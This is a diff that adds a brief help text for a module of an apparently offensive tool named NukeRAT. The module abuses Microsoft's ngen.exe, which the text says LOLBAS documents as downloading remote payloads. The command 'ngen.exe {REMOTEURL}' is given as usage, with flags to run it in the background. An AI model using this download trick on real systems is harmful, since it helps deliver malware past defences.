@@ -1,0 +1,16 @@
+ABOUT
+    Microsoft Native Image Generator. LOLBAS documents it will
+    download a remote payload and place it in INetCache.
+
+USAGE:
+    ngen.exe {REMOTEURL}
+
+EXAMPLES:
+    ngen.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    ngen.exe {REMOTEURL}
